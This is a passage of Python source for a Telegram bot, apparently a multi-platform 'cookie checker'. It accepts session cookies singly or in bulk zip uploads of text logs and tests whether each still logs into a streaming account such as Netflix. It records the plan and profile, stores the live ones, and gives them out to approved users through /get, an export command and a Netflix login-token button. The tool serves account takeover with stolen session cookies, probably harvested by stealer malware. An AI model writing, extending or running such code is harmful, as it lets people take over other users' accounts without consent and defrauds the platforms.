        return

    platform = args[0].lower()
    if platform not in PLATFORMS:
        await update.message.reply_text(
            f"{get_emoji('❌')} <b>Invalid platform.</b>\nSupported: {', '.join(PLATFORMS)}",
            parse_mode="HTML"
        )
        return

    cookie = " ".join(args[1:])
    if not validate_cookie_generic(cookie):
        await update.message.reply_text(
            f"{get_emoji('⛔️')} <b>Invalid Cookie Format</b>",
            parse_mode="HTML"
        )
        return

    cookie_id = db.add_cookie(cookie, platform, user_id)
    msg = await update.message.reply_text(
        f"{get_emoji('⏳')} <b>Checking {platform} cookie...</b>\nID: <code>{cookie_id}</code>",
        parse_mode="HTML"
    )

    result = await check_single_cookie_platform(cookie, platform)

    if result.get("valid"):
        db.update_cookie_status(cookie_id, "valid", {
            "account_tier": result.get("account_tier"),
            "profile_name": result.get("profile_name"),
            "profile_language": result.get("profile_language"),
            "maturity_level": result.get("maturity_level"),
            "expires_at": result.get("expires_at")
        })
        db.increment_user_stats(user_id, 1, 1)
        status_text = f"{get_emoji('✅')} <b>ACCOUNT ACTIVE</b>"
    else:
        status = "expired" if "expired" in str(result.get("error", "")).lower() else "invalid"
        db.update_cookie_status(cookie_id, status, {"error": result.get("error")})
        db.increment_user_stats(user_id, 1, 0)
        status_text = f"{get_emoji('❌')} <b>INVALID / EXPIRED</b>"

    db.log_check(user_id, cookie_id, platform, result.get("valid") and "valid" or "invalid", result)
    db.update_user_activity(user_id)

    if result.get("valid"):
        response = (
            f"{format_header(f'{platform.title()} Validation', '✅')}\n"
            f"{SEP}\n"
            f"{status_text}\n\n"
            f"{get_emoji('📊')} <b>Plan:</b> <code>{result.get('account_tier', 'Unknown')}</code>\n"
            f"{get_emoji('👤')} <b>Profile:</b> <code>{result.get('profile_name', 'Unknown')}</code>\n"
        )
        if result.get('expires_at'):
            response += f"{get_emoji('📅')} <b>Expires:</b> <code>{result.get('expires_at')}</code>\n"
        response += f"{get_emoji('🆔')} <b>Cookie ID:</b> <code>{cookie_id}</code>\n"

        # Try to get nftoken for Netflix only
        nftoken = None
        if platform == "netflix":
            cookie_doc = db.get_cookie(cookie_id)
            if cookie_doc:
                raw = denormalize_cookie(cookie_doc.get("cookie", ""))
                nftoken = extract_nftoken(raw)  # need to define extract_nftoken from earlier
        keyboard = build_login_keyboard(cookie_id, platform, nftoken)
        await msg.edit_text(response, parse_mode="HTML", reply_markup=keyboard)
    else:
        response = (
            f"{format_header(f'{platform.title()} Validation Failed', '❌')}\n"
            f"{SEP}\n"
            f"{status_text}\n\n"
            f"{get_emoji('⚠️')} <b>Error:</b> <code>{result.get('error', 'Unknown error')}</code>\n"
            f"{get_emoji('🆔')} <b>Cookie ID:</b> <code>{cookie_id}</code>"
        )
        await msg.edit_text(response, parse_mode="HTML")

async def handle_cookie_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # For backward compatibility, treat as Netflix by default
    # But we require platform, so ask user to use /check
    await update.message.reply_text(
        f"{get_emoji('❌')} Please use <code>/check &lt;platform&gt; &lt;cookie&gt;</code>",
        parse_mode="HTML"
    )

# ========================== FILE / ZIP HANDLER =============================
async def handle_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text(
            f"{get_emoji('⛔️')} <b>Access Denied</b>",
            parse_mode="HTML"
        )
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            f"{get_emoji('❌')} <b>Usage:</b> <code>/upload &lt;platform&gt;</code> (attach .zip file)",
            parse_mode="HTML"
        )
        return

    platform = args[0].lower()
    if platform not in PLATFORMS:
        await update.message.reply_text(
            f"{get_emoji('❌')} Invalid platform. Supported: {', '.join(PLATFORMS)}",
            parse_mode="HTML"
        )
        return

    if not update.message.document:
        await update.message.reply_text(
            f"{get_emoji('❌')} Please attach a .zip file.",
            parse_mode="HTML"
        )
        return

    doc = update.message.document
    if not doc.file_name.endswith('.zip'):
        await update.message.reply_text(
            f"{get_emoji('❌')} Only .zip files are supported.",
            parse_mode="HTML"
        )
        return

    msg = await update.message.reply_text(
        f"{get_emoji('⏳')} <b>Processing {platform} zip...</b>",
        parse_mode="HTML"
    )

    try:
        file = await context.bot.get_file(doc.file_id)
        zip_data = await file.download_as_bytearray()
        zip_bytes = io.BytesIO(zip_data)
        with zipfile.ZipFile(zip_bytes, 'r') as zf:
            all_cookies = []
            for name in zf.namelist():
                if name.endswith('.txt'):
                    content = zf.read(name).decode('utf-8', errors='ignore')
                    cookies = extract_cookies_from_text(content)
                    all_cookies.extend(cookies)
            if not all_cookies:
                await msg.edit_text(
                    f"{get_emoji('❌')} No valid cookies found in zip.",
                    parse_mode="HTML"
                )
                return

            if len(all_cookies) > MAX_BULK_CHECK:
                await msg.edit_text(
                    f"{get_emoji('⛔️')} Too many cookies: {len(all_cookies)} > {MAX_BULK_CHECK}",
                    parse_mode="HTML"
                )
                return

            # Deduplicate and skip known valid if configured
            unique_cookies = []
            skipped = 0
            for c in all_cookies:
                cookie_hash = hashlib.sha256(c.encode()).hexdigest()
                if SKIP_VALID_RECHECK:
                    existing_valid = db.get_valid_cookie_by_hash(cookie_hash, platform)
                    if existing_valid:
                        skipped += 1
                        continue
                unique_cookies.append(c)

            if not unique_cookies:
                await msg.edit_text(
                    f"{get_emoji('✅')} All cookies already valid (skipped {skipped}).",
                    parse_mode="HTML"
                )
                return

            total = len(unique_cookies)
            await msg.edit_text(
                f"{get_emoji('⏳')} Checking {total} cookies...\n0 / {total}",
                parse_mode="HTML"
            )

            async def progress_callback(current, total):
                if current % 5 == 0 or current == total:
                    try:
                        await msg.edit_text(
                            f"{get_emoji('⏳')} Checking...\n{current} / {total}",
                            parse_mode="HTML"
                        )
                    except:
                        pass

            results = await check_bulk_cookies_platform(unique_cookies, platform, progress_callback)

            valid_list = []
            invalid_count = 0
            for result in results:
                cookie = result.get("cookie", "")
                if not cookie:
                    invalid_count += 1
                    continue
                if result.get("valid"):
                    cookie_id = db.add_cookie(cookie, platform, user_id)
                    details = {
                        "account_tier": result.get("account_tier"),
                        "profile_name": result.get("profile_name"),
                        "profile_language": result.get("profile_language"),
                        "maturity_level": result.get("maturity_level"),
                        "expires_at": result.get("expires_at")
                    }
                    db.update_cookie_status(cookie_id, "valid", details)
                    db.log_check(user_id, cookie_id, platform, "valid", result)
                    valid_list.append({
                        "id": cookie_id,
                        "tier": result.get("account_tier", "Unknown"),
                        "profile": result.get("profile_name", "Unknown")
                    })
                else:
                    invalid_count += 1

            db.increment_user_stats(user_id, total, len(valid_list))
            db.update_user_activity(user_id)

            header = f"{format_header(f'{platform.title()} Bulk Check Complete', '📊')}"
            sep = SEP
            lines = [
                header,
                sep,
                f"{get_emoji('📥')} <b>Processed:</b> <code>{total + skipped}</code> "
                f"({get_emoji('🔄')} skipped valid: <code>{skipped}</code>)" if skipped else f"{get_emoji('📥')} <b>Processed:</b> <code>{total}</code>",
                f"{get_emoji('✅')} <b>Valid:</b> <code>{len(valid_list)}</code>"
            ]
            if valid_list:
                lines.append("")
                lines.append(f"{get_emoji('🆔')} <b>Valid Cookies:</b>")
                for idx, info in enumerate(valid_list[:20], 1):
                    lines.append(
                        f"  {idx}. {get_emoji('⭐')} <b>ID:</b> <code>{info['id']}</code>  "
                        f"| {get_emoji('📊')} <code>{info['tier']}</code>  "
                        f"| {get_emoji('👤')} <code>{info['profile']}</code>"
                    )
                if len(valid_list) > 20:
                    lines.append(f"  {get_emoji('...')} <i>and {len(valid_list) - 20} more</i>")
            lines.append("")
            lines.append(f"{get_emoji('❌')} <b>Invalid/Expired:</b> <code>{invalid_count}</code>")
            lines.append("")
            lines.append(f"{get_emoji('🦇')} <b>Developer:</b> @Xalonexdev03")

            final_text = "\n".join(lines)
            await msg.edit_text(final_text, parse_mode="HTML")

    except Exception as e:
        logger.error(f"Zip processing error: {e}")
        await msg.edit_text(
            f"{get_emoji('⚠️')} <b>Error</b>\n\n<code>{str(e)}</code>",
            parse_mode="HTML"
        )

async def valid_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text(
            f"{get_emoji('⛔️')} <b>Access Denied</b>",
            parse_mode="HTML"
        )
        return

    args = context.args
    if not args or args[0].lower() not in PLATFORMS:
        await update.message.reply_text(
            f"{get_emoji('❌')} Usage: <code>/valid &lt;platform&gt;</code>\n"
            f"Platforms: {', '.join(PLATFORMS)}",
            parse_mode="HTML"
        )
        return

    platform = args[0].lower()
    cookies = db.get_valid_cookies(platform=platform, limit=20)
    if not cookies:
        await update.message.reply_text(
            f"{get_emoji('📭')} <b>No valid cookies for {platform}</b>",
            parse_mode="HTML"
        )
        return

    response = f"{format_header(f'Valid {platform.title()} Cookies', '✅')}\n{SEP}\n"
    for i, cookie in enumerate(cookies[:10], 1):
        tier = cookie.get('account_tier', 'Unknown')
        profile = cookie.get('profile_name', 'Unknown')
        cid = cookie['_id']
        response += (
            f"{i}. {get_emoji('⭐')} <b>Tier:</b> <code>{tier}</code>\n"
            f"   {get_emoji('👤')} <b>Profile:</b> <code>{profile}</code>\n"
            f"   {get_emoji('🆔')} ID: <code>{cid}</code>\n"
            f"   (use <code>{cid[:8]}</code> for short)\n\n"
        )

    if len(cookies) > 10:
        response += f"\n{get_emoji('...')} <i>and {len(cookies) - 10} more.</i>"

    await update.message.reply_text(response, parse_mode="HTML")

async def get_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text(
            f"{get_emoji('⛔️')} <b>Access Denied</b>",
            parse_mode="HTML"
        )
        return

    args = context.args
    if not args or args[0].lower() not in PLATFORMS:
        await update.message.reply_text(
            f"{get_emoji('❌')} Usage: <code>/get &lt;platform&gt;</code>\n"
            f"Platforms: {', '.join(PLATFORMS)}",
            parse_mode="HTML"
        )
        return

    platform = args[0].lower()
    cookies = db.get_valid_cookies(platform=platform, limit=1)
    if not cookies:
        await update.message.reply_text(
            f"{get_emoji('📭')} No valid {platform} cookies available.",
            parse_mode="HTML"
        )
        return

    cookie_doc = cookies[0]
    raw = denormalize_cookie(cookie_doc['cookie'])
    # Send as plain text
    await update.message.reply_text(
        f"{get_emoji('✅')} <b>Valid {platform} Cookie</b>\n\n"
        f"<code>{raw}</code>\n\n"
        f"ID: <code>{cookie_doc['_id']}</code>\n"
        f"Profile: {cookie_doc.get('profile_name', 'Unknown')}",
        parse_mode="HTML"
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text(
            f"{get_emoji('⛔️')} <b>Access Denied</b>",
            parse_mode="HTML"
        )
        return

    lines = [f"{format_header('Statistics', '📊')}", SEP]
    for platform in PLATFORMS:
        stats = db.get_cookie_stats(platform=platform)
        lines.append(f"{get_emoji('📌')} <b>{platform.title()}</b>")
        lines.append(f"  Total: {stats['total']} | Valid: {stats['valid']} | Invalid/Expired: {stats['invalid']+stats['expired']}")
    await update.message.reply_text("\n".join(lines), parse_mode="HTML")

# ========================== ADMIN COMMANDS ==============================
# (Keep all admin commands from previous version – they will work with platform awareness if needed)
# We'll reuse the existing admin_approve, admin_disapprove, admin_users, admin_export, admin_cleanup, admin_clear.
# But we need to modify admin_export to accept platform? For simplicity, we'll keep as is (exports all cookies).
# However, we can enhance: /export <platform> to export only that platform.

@admin_required
async def admin_export(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    platform = args[0].lower() if args and args[0].lower() in PLATFORMS else None
    cookies = db.get_valid_cookies(platform=platform)
    if not cookies:
        await update.message.reply_text(
            f"{get_emoji('📭')} No valid cookies to export.",
            parse_mode="HTML"
        )
        return

    os.makedirs(EXPORT_DIR, exist_ok=True)
    filename = f"{platform or 'all'}_valid_{int(time.time())}.txt"
    filepath = os.path.join(EXPORT_DIR, filename)

    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(f"# Valid Cookies for {platform or 'All'}\n")
        f.write(f"# Exported: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Total: {len(cookies)}\n\n")
        for cookie in cookies:
            f.write(f"{cookie['cookie']}\n")

    with open(filepath, 'rb') as f:
        await update.message.reply_document(
            document=f,
            filename=filename,
            caption=f"{get_emoji('✅')} <b>{len(cookies)} valid cookies exported.</b>",
            parse_mode="HTML"
        )
    os.remove(filepath)

@admin_required
async def admin_cleanup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    platform = args[0].lower() if args and args[0].lower() in PLATFORMS else None
    msg = await update.message.reply_text(
        f"{get_emoji('🔄')} Cleaning up invalid cookies...",
        parse_mode="HTML"
    )
    deleted = db.delete_invalid_cookies(platform=platform)
    await msg.edit_text(
        f"{get_emoji('✅')} Deleted {deleted} invalid/expired cookies.",
        parse_mode="HTML"
    )

@admin_required
async def admin_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ Yes, clear all", callback_data="clear_confirm"),
            InlineKeyboardButton("❌ Cancel", callback_data="clear_cancel")
        ]
    ])
    await update.message.reply_text(
        f"{get_emoji('⚠️')} <b>DANGER: Clear All Cookies</b>\n\n"
        f"This will delete ALL cookies from ALL platforms.\n"
        f"This action cannot be undone.\n\n"
        f"Are you sure?",
        reply_markup=keyboard,
        parse_mode="HTML"
    )

async def clear_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "clear_confirm":
        user_id = query.from_user.id
        if user_id not in ADMIN_IDS:
            await query.edit_message_text(
                f"{get_emoji('⛔️')} <b>Unauthorized</b>",
                parse_mode="HTML"
            )
            return
        total = db.cookies.count_documents({})
        db.cookies.delete_many({})
        await query.edit_message_text(
            f"{get_emoji('✅')} <b>Cleared {total} cookies from database.</b>",
            parse_mode="HTML"
        )
    else:
        await query.edit_message_text(
            f"{get_emoji('❌')} <b>Operation cancelled.</b>",
            parse_mode="HTML"
        )

# ========================== CALLBACK HANDLERS ===========================
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "restart":
        await start(update, context)
        await query.edit_message_text(
            f"{get_emoji('🔄')} <b>Restarted.</b>",
            parse_mode="HTML"
        )
        return

    if data.startswith("upload_"):
        await query.edit_message_text(
            f"{get_emoji('📤')} Use <code>/upload &lt;platform&gt;</code> with .zip file.",
            parse_mode="HTML"
        )
        return

# ========================== ERROR HANDLER ==============================
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error: {context.error}")
    try:
        if update and update.message:
            await update.message.reply_text(
                f"{get_emoji('⚠️')} <b>Internal Error</b>\n\n"
                f"Please try again later.",
                parse_mode="HTML"
            )
    except:
        pass

# ========================== MAIN ======================================
def main():
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN not set!")
        sys.exit(1)

    application = Application.builder().token(BOT_TOKEN).build()

    # User commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("check", check_single))
    application.add_handler(CommandHandler("upload", handle_upload))
    application.add_handler(CommandHandler("valid", valid_cookies))
    application.add_handler(CommandHandler("get", get_cookie))
    application.add_handler(CommandHandler("stats", stats_command))

    # Admin commands (overridden with platform support)
    application.add_handler(CommandHandler("approve", admin_approve))  # keep old
    application.add_handler(CommandHandler("disapprove", admin_disapprove))
    application.add_handler(CommandHandler("users", admin_users))
    application.add_handler(CommandHandler("export", admin_export))
    application.add_handler(CommandHandler("cleanup", admin_cleanup))
    application.add_handler(CommandHandler("clear", admin_clear))

    # Message handlers
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie_message))
    # Document handler (non-zip will be caught by upload command, but we can also handle general)
    application.add_handler(MessageHandler(filters.Document.ALL, handle_upload))

    # Callbacks
    application.add_handler(CallbackQueryHandler(callback_handler, pattern="^(upload_|restart)"))
    application.add_handler(CallbackQueryHandler(clear_callback, pattern="^clear_"))

    application.add_error_handler(error_handler)

    logger.info("Multi-Platform Cookie Checker Bot started!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()